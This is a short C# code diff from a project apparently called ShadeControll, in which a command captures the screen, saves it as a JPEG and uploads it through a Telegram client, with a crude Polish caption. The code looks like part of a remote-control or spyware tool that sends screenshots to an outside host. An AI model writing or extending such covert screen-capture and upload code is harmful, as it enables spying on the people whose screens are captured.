@@ -26,7 +26,7 @@ namespace ShadeControll.Commands
             string fileName = "SCR/" + DateTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".jpg";
             captureBitmap.Save(fileName, ImageFormat.Jpeg);
             Thread.Sleep(1000);
-            Program.Client.UploadFile(fileName, "elo pomelo szmaty");
+            Program.telegramClient.UploadFile(fileName, "elo pomelo szmaty");
             base.Execute(args);
         }
     }
